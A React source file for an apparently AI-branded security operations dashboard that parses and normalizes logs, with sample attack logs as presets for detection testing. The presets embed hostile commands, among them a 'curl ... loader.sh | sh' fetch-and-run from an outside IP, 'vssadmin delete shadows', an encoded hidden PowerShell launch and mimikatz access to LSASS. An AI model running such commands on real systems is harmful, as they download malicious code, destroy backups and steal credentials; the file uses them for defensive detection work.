/**
 * CyberNexsus Edge AI SOC - Event Normalizer & Ingestion Workbench
 * Ingestion from Windows Event Logs, Sysmon, Linux auth.log/syslog, Zeek, Suricata, Splunk
 */

import React, { useState } from 'react';
import { 
  Layers, 
  Upload, 
  Play, 
  CheckCircle2, 
  RefreshCw, 
  FileText, 
  ShieldAlert, 
  FileCode, 
  ArrowRight,
  Database,
  Hash,
  Copy
} from 'lucide-react';
import { NormalizedSecurityEvent, LogSourceType, SecurityAlert, SecurityIOC } from '../types';
import { EventNormalizer } from '../services/eventNormalizer';
import { DetectionEngine } from '../services/detectionEngine';

interface EventNormalizerViewProps {
  events: NormalizedSecurityEvent[];
  onIngestNewEvents: (newEvents: NormalizedSecurityEvent[], newAlerts: SecurityAlert[]) => void;
  iocs: SecurityIOC[];
}

const SAMPLE_LOG_PRESETS = [
  {
    name: 'Suricata EVE JSON (Cobalt Strike C2)',
    type: 'suricata' as LogSourceType,
    raw: '{"timestamp":"2026-09-24T06:45:10.002Z","flow_id":982736152,"event_type":"alert","src_ip":"10.0.4.15","src_port":49812,"dest_ip":"194.26.29.112","dest_port":8443,"alert":{"action":"allowed","gid":1,"signature_id":2028912,"rev":2,"signature":"ET TROJAN Cobalt Strike Beacon Response Activity Observed","category":"A Network Trojan was detected","severity":1}}',
  },
  {
    name: 'Sysmon Event ID 1 (Obfuscated PowerShell)',
    type: 'sysmon' as LogSourceType,
    raw: '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><TimeCreated SystemTime="2026-09-24T06:48:30Z"/><Computer>WKSTN-FIN-04.corp.nexsus</Computer></System><EventData><Data Name="RuleName">SuspiciousPowerShell</Data><Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name="CommandLine">powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==</Data><Data Name="ParentImage">C:\\Windows\\System32\\cmd.exe</Data><Data Name="User">CORP\\f_martinez</Data><Data Name="Hashes">SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</Data></EventData></Event>',
  },
  {
    name: 'Sysmon Event ID 10 (LSASS Dump)',
    type: 'sysmon' as LogSourceType,
    raw: '<Event><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>10</EventID><Computer>WKSTN-FIN-04.corp.nexsus</Computer></System><EventData><Data Name="SourceImage">C:\\Users\\f_martinez\\AppData\\Local\\Temp\\mimikatz.exe</Data><Data Name="TargetImage">C:\\Windows\\System32\\lsass.exe</Data><Data Name="GrantedAccess">0x1010</Data></EventData></Event>',
  },
  {
    name: 'Windows Event ID 4688 (vssadmin delete shadows)',
    type: 'windows_event' as LogSourceType,
    raw: '<Event><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4688</EventID><Computer>WKSTN-FIN-04.corp.nexsus</Computer></System><EventData><Data Name="NewProcessName">C:\\Windows\\System32\\vssadmin.exe</Data><Data Name="CommandLine">vssadmin.exe delete shadows /all /quiet</Data><Data Name="SubjectUserName">f_martinez</Data></EventData></Event>',
  },
  {
    name: 'Linux auth.log (SSH Password Brute Force)',
    type: 'linux_auth' as LogSourceType,
    raw: 'Sep 24 06:40:12 srv-prod-01 sshd[28491]: Failed password for invalid user admin from 185.220.101.5 port 42810 ssh2',
  },
  {
    name: 'Linux syslog (Sudo Remote Shell Execution)',
    type: 'linux_syslog' as LogSourceType,
    raw: 'Sep 24 06:43:18 srv-prod-01 sudo:   deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c "curl -s http://194.26.29.112/loader.sh | sh"',
  },
  {
    name: 'Zeek conn.log (High-Port C2 Session)',
    type: 'zeek' as LogSourceType,
    raw: '{"ts":1758703442.1,"uid":"CWu9832oij1","id.orig_h":"10.0.4.15","id.orig_p":49812,"id.resp_h":"194.26.29.112","id.resp_p":8443,"proto":"tcp","service":"ssl","orig_bytes":4820,"resp_bytes":312010,"conn_state":"SF"}',
  },
  {
    name: 'Splunk Ingest (New Service Created 7045)',
    type: 'splunk' as LogSourceType,
    raw: '{"time":"2026-09-24T06:52:14Z","host":"WKSTN-FIN-04","sourcetype":"WinEventLog:Security","EventCode":7045,"ServiceName":"NexsusRemoteAgent","ImagePath":"C:\\ProgramData\\NexsusAgent.exe","ServiceType":"user mode service","StartType":"auto start"}',
  },
];

export const EventNormalizerView: React.FC<EventNormalizerViewProps> = ({
  events,
  onIngestNewEvents,
  iocs,
}) => {
  const [inputText, setInputText] = useState(SAMPLE_LOG_PRESETS[0].raw);
  const [selectedFormat, setSelectedFormat] = useState<LogSourceType>('suricata');
  const [normalizedResult, setNormalizedResult] = useState<NormalizedSecurityEvent | null>(null);
  const [ingestionStatus, setIngestionStatus] = useState<string | null>(null);
  const [showForwarderScripts, setShowForwarderScripts] = useState(false);
  const [activeForwarderTab, setActiveForwarderTab] = useState<'windows' | 'linux' | 'suricata'>('windows');
  const [copiedScript, setCopiedScript] = useState(false);

  // Compute live deduplication statistics across all events
  const dedupStats = EventNormalizer.deduplicateEvents(events);

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (event) => {
      const content = event.target?.result as string;
      if (content) {
        setInputText(content);
        const detected = EventNormalizer.detectLogType(content);
        setSelectedFormat(detected);
        const parsed = EventNormalizer.parseAndNormalize(content, detected);
        setNormalizedResult(parsed);
        setIngestionStatus(`Loaded file ${file.name} (${(file.size / 1024).toFixed(1)} KB) and auto-detected format: ${detected.toUpperCase()}`);
      }
    };
    reader.readAsText(file);
  };

  const handleNormalizePreview = () => {
    if (!inputText.trim()) return;
    const parsed = EventNormalizer.parseAndNormalize(inputText.trim(), selectedFormat);
    setNormalizedResult(parsed);
  };

  const handleIngestAndCorrelate = () => {
    if (!inputText.trim()) return;
    const parsed = EventNormalizer.parseAndNormalize(inputText.trim(), selectedFormat);
    
    // Add to event stream and run detection engine
    const combinedEvents = [parsed, ...events];
    const generatedAlerts = DetectionEngine.runDetection(combinedEvents, iocs);

    onIngestNewEvents([parsed], generatedAlerts);
    setIngestionStatus(`Event successfully normalized, deduplicated, and fed into Detection Engine!`);
    setTimeout(() => setIngestionStatus(null), 4000);
  };

  const handleSelectPreset = (preset: typeof SAMPLE_LOG_PRESETS[0]) => {
    setInputText(preset.raw);
    setSelectedFormat(preset.type);
    const parsed = EventNormalizer.parseAndNormalize(preset.raw, preset.type);
    setNormalizedResult(parsed);
  };

  return (
    <div className="p-6 space-y-6 max-w-7xl mx-auto">
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <h1 className="text-2xl font-bold tracking-tight text-white flex items-center gap-2">
            <Layers className="w-7 h-7 text-cyan-400" />
            <span>Event Normalizer & Ingestion Pipeline</span>
          </h1>
          <p className="text-sm text-slate-400 font-mono mt-1">
            Standardizing Windows Event Logs, Sysmon, Linux auth, Zeek, Suricata & Splunk into Common Information Model (CIM)
          </p>
        </div>

        {/* Deduplication & Correlation telemetry badge */}
        <div className="flex items-center gap-3 bg-[#0c1322] border border-slate-800 rounded-xl px-4 py-2 font-mono text-xs">
          <div className="flex items-center gap-1.5 text-slate-300">
            <Hash className="w-4 h-4 text-cyan-400" />
            <span>Total Parsed: <b className="text-white">{events.length}</b></span>
          </div>
          <span className="text-slate-600">|</span>
          <div className="flex items-center gap-1.5 text-slate-300">
            <Database className="w-4 h-4 text-emerald-400" />
            <span>Unique Signatures: <b className="text-emerald-400">{dedupStats.uniqueEvents.length}</b></span>
          </div>
        </div>
      </div>

      {/* Preset Pickers & Real Data Ingest Options */}
      <div className="bg-[#0c1322] border border-slate-800 rounded-xl p-4 space-y-3">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800/80 pb-2">
          <div className="text-xs font-mono font-bold text-slate-400 uppercase tracking-wider flex items-center gap-2">
            <FileCode className="w-4 h-4 text-cyan-400" />
            <span>Real PC Data Ingestion & Live Log Presets</span>
          </div>

          <div className="flex items-center gap-2">
            {/* Real File Upload */}
            <label className="px-3 py-1 rounded-lg bg-cyan-950/80 hover:bg-cyan-900 border border-cyan-700/80 text-cyan-300 font-mono text-xs font-bold transition cursor-pointer flex items-center gap-1.5">
              <Upload className="w-3.5 h-3.5" />
              <span>Upload Real PC Log File</span>
              <input
                type="file"
                accept=".log,.txt,.json,.xml,.csv"
                onChange={handleFileUpload}
                className="hidden"
              />
            </label>

            {/* Live Forwarder Scripts Toggle */}
            <button
              onClick={() => setShowForwarderScripts(!showForwarderScripts)}
              className="px-3 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 font-mono text-xs font-bold transition cursor-pointer flex items-center gap-1.5"
            >
              <span>{showForwarderScripts ? 'Hide Forwarder Scripts' : 'Real PC Forwarder Scripts'}</span>
            </button>
          </div>
        </div>

        {/* Real Forwarder Scripts Drawer */}
        {showForwarderScripts && (
          <div className="bg-[#080d16] border border-cyan-900/60 rounded-xl p-4 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between">
              <span className="text-cyan-300 font-bold">REAL PC LOG FORWARDER SCRIPTS:</span>
              <div className="flex items-center gap-1.5">
                <button
                  onClick={() => setActiveForwarderTab('windows')}
                  className={`px-2.5 py-1 rounded ${activeForwarderTab === 'windows' ? 'bg-cyan-600 text-white font-bold' : 'bg-slate-900 text-slate-400'}`}
                >
                  Windows / Sysmon
                </button>
                <button
                  onClick={() => setActiveForwarderTab('linux')}
                  className={`px-2.5 py-1 rounded ${activeForwarderTab === 'linux' ? 'bg-cyan-600 text-white font-bold' : 'bg-slate-900 text-slate-400'}`}
                >
                  Linux auth.log / sshd
                </button>
                <button
                  onClick={() => setActiveForwarderTab('suricata')}
                  className={`px-2.5 py-1 rounded ${activeForwarderTab === 'suricata' ? 'bg-cyan-600 text-white font-bold' : 'bg-slate-900 text-slate-400'}`}
                >
                  Suricata / Zeek
                </button>
              </div>
            </div>

            {activeForwarderTab === 'windows' && (
              <div className="space-y-1.5">
                <p className="text-slate-400 text-[11px] font-sans">
                  Run this PowerShell script as Administrator on your real Windows machine to export recent Sysmon & Security Audit events to a log file or clipboard:
                </p>
                <pre className="bg-[#04060d] p-3 rounded-lg border border-slate-800 text-emerald-300 overflow-x-auto select-all">
{`# 1. Export live Sysmon (Event 1, 3, 10) & Windows Security (Event 4688, 4624)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1,3,10} -MaxEvents 50 | 
  ForEach-Object { $_.ToXml() } | Out-File -FilePath "$HOME\\Desktop\\real_sysmon_events.xml" -Encoding utf8

# 2. Or copy directly to clipboard to paste into CyberNexsus:
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1,10} -MaxEvents 5 | 
  ForEach-Object { $_.ToXml() } | Set-Clipboard`}
                </pre>
              </div>
            )}

            {activeForwarderTab === 'linux' && (
              <div className="space-y-1.5">
                <p className="text-slate-400 text-[11px] font-sans">
                  Run this command on your real Linux / cloud server to capture live SSH and sudo audit logs:
                </p>
                <pre className="bg-[#04060d] p-3 rounded-lg border border-slate-800 text-emerald-300 overflow-x-auto select-all">
{`# Tail last 100 authentication events to a file
journalctl -u ssh -u sshd -n 100 --no-pager > ~/real_auth_events.log
# Or tail /var/log/auth.log
tail -n 100 /var/log/auth.log > ~/real_auth.log`}
                </pre>
              </div>
            )}

            {activeForwarderTab === 'suricata' && (
              <div className="space-y-1.5">
                <p className="text-slate-400 text-[11px] font-sans">
                  Stream real Suricata EVE JSON alerts directly:
                </p>
                <pre className="bg-[#04060d] p-3 rounded-lg border border-slate-800 text-emerald-300 overflow-x-auto select-all">
{`# Extract latest EVE JSON alert events
tail -n 50 /var/log/suricata/eve.json | grep '"event_type":"alert"' > ~/suricata_alerts.json`}
                </pre>
              </div>
            )}
          </div>
        )}

        <div className="flex flex-wrap gap-2">
          {SAMPLE_LOG_PRESETS.map((preset, i) => (
            <button
              key={i}
              onClick={() => handleSelectPreset(preset)}
              className="px-3 py-1.5 rounded-lg bg-[#080d16] hover:bg-[#101c33] border border-slate-800 hover:border-cyan-600 text-xs font-mono text-slate-300 transition cursor-pointer flex items-center gap-1.5"
            >
              <span className="w-1.5 h-1.5 rounded-full bg-cyan-400"></span>
              <span>{preset.name}</span>
            </button>
          ))}
        </div>
      </div>

      {/* Ingestion Workbench Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        {/* Left: Raw Input (6 cols) */}
        <div className="lg:col-span-6 bg-[#0c1322] border border-slate-800 rounded-xl p-5 space-y-4">
          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
            <span className="font-mono text-xs font-bold text-white uppercase tracking-wider">
              RAW LOG INPUT
            </span>

            {/* Parser selector */}
            <div className="flex items-center gap-2 text-xs font-mono">
              <span className="text-slate-400">Target Parser:</span>
              <select
                value={selectedFormat}
                onChange={e => setSelectedFormat(e.target.value as LogSourceType)}
                className="bg-[#080d16] border border-slate-700 rounded px-2.5 py-1 text-cyan-300 font-semibold focus:outline-none focus:border-cyan-500 cursor-pointer"
              >
                <option value="suricata">Suricata EVE JSON</option>
                <option value="sysmon">Windows Sysmon (XML/Text)</option>
                <option value="windows_event">Windows Event Security</option>
                <option value="linux_auth">Linux auth.log / sshd</option>
                <option value="linux_syslog">Linux syslog / sudo</option>
                <option value="zeek">Zeek (conn/dns/http)</option>
                <option value="splunk">Splunk CIM JSON</option>
              </select>
            </div>
          </div>

          <textarea
            value={inputText}
            onChange={e => setInputText(e.target.value)}
            rows={10}
            placeholder="Paste raw log lines or JSON payload here..."
            className="w-full bg-[#050811] border border-slate-800 rounded-lg p-3 font-mono text-xs text-emerald-300 placeholder-slate-600 focus:outline-none focus:border-cyan-500"
          />

          <div className="flex items-center justify-between gap-3 pt-2">
            <button
              onClick={handleNormalizePreview}
              className="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 font-mono text-xs font-semibold transition cursor-pointer flex items-center gap-1.5"
            >
              <RefreshCw className="w-3.5 h-3.5 text-cyan-400" />
              <span>Preview Normalization</span>
            </button>

            <button
              onClick={handleIngestAndCorrelate}
              className="px-5 py-2 rounded-lg bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-mono text-xs font-bold transition cursor-pointer flex items-center gap-1.5 shadow-md shadow-cyan-500/25"
            >
              <Play className="w-3.5 h-3.5 fill-white" />
              <span>Ingest & Run Detection</span>
            </button>
          </div>

          {ingestionStatus && (
            <div className="p-3 rounded-lg bg-emerald-950/80 border border-emerald-700 text-xs font-mono text-emerald-200 flex items-center gap-2">
              <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
              <span>{ingestionStatus}</span>
            </div>
          )}
        </div>

        {/* Right: Normalized Schema Output (6 cols) */}
        <div className="lg:col-span-6 bg-[#0c1322] border border-slate-800 rounded-xl p-5 space-y-4">
          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
            <span className="font-mono text-xs font-bold text-cyan-300 uppercase tracking-wider">
              NORMALIZED ECS/CIM RECORD
            </span>
            {normalizedResult && (
              <span className="text-xs font-mono text-slate-400">
                Generated Signature: <b className="text-cyan-400">{normalizedResult.dedupHash.substring(0, 18)}...</b>
              </span>
            )}
          </div>

          {normalizedResult ? (
            <div className="space-y-3 font-mono text-xs">
              <div className="bg-[#080d16] rounded-lg border border-slate-800 p-4 space-y-2">
                <div className="flex justify-between border-b border-slate-800/80 pb-1.5">
                  <span className="text-slate-400">Event Category:</span>
                  <span className="text-cyan-300 font-bold">{normalizedResult.eventCategory}</span>
                </div>
                <div className="flex justify-between border-b border-slate-800/80 pb-1.5">
                  <span className="text-slate-400">Severity Assessment:</span>
                  <span className="text-red-400 font-bold">{normalizedResult.severity}</span>
                </div>
                <div className="flex justify-between border-b border-slate-800/80 pb-1.5">
                  <span className="text-slate-400">Host Entity:</span>
                  <span className="text-white font-bold">{normalizedResult.hostname}</span>
                </div>
                {normalizedResult.username && (
                  <div className="flex justify-between border-b border-slate-800/80 pb-1.5">
                    <span className="text-slate-400">User Identity:</span>
                    <span className="text-indigo-300 font-bold">{normalizedResult.username}</span>
                  </div>
                )}
                {normalizedResult.srcIp && (
                  <div className="flex justify-between border-b border-slate-800/80 pb-1.5">
                    <span className="text-slate-400">Source IP & Port:</span>
                    <span className="text-slate-200">{normalizedResult.srcIp}:{normalizedResult.srcPort || 'N/A'}</span>
                  </div>
                )}
                {normalizedResult.dstIp && (
                  <div className="flex justify-between border-b border-slate-800/80 pb-1.5">
                    <span className="text-slate-400">Destination IP & Port:</span>
                    <span className="text-amber-400 font-bold">{normalizedResult.dstIp}:{normalizedResult.dstPort || 'N/A'}</span>
                  </div>
                )}
                {normalizedResult.processName && (
                  <div className="flex justify-between border-b border-slate-800/80 pb-1.5">
                    <span className="text-slate-400">Process Name:</span>
                    <span className="text-emerald-300 font-semibold">{normalizedResult.processName}</span>
                  </div>
                )}
                {normalizedResult.hashes?.sha256 && (
                  <div className="flex justify-between border-b border-slate-800/80 pb-1.5">
                    <span className="text-slate-400">SHA256 Hash:</span>
                    <span className="text-purple-300 truncate max-w-[240px]">{normalizedResult.hashes.sha256}</span>
                  </div>
                )}
                <div className="flex justify-between pt-1">
                  <span className="text-slate-400">Normalized Message:</span>
                  <span className="text-slate-200 text-right max-w-[280px]">{normalizedResult.message}</span>
                </div>
              </div>

              {/* JSON representation */}
              <div>
                <div className="text-[11px] font-mono text-slate-400 mb-1">Standardized JSON Object:</div>
                <pre className="bg-[#050811] border border-slate-800 p-3 rounded-lg text-[11px] text-cyan-200 max-h-48 overflow-y-auto whitespace-pre-wrap select-all">
                  {JSON.stringify(normalizedResult, null, 2)}
                </pre>
              </div>
            </div>
          ) : (
            <div className="bg-[#080d16] rounded-xl border border-slate-800 p-12 text-center text-slate-500 font-mono text-xs">
              Click "Preview Normalization" to parse raw logs into standardized event fields.
            </div>
          )}
        </div>

      </div>
    </div>
  );
};
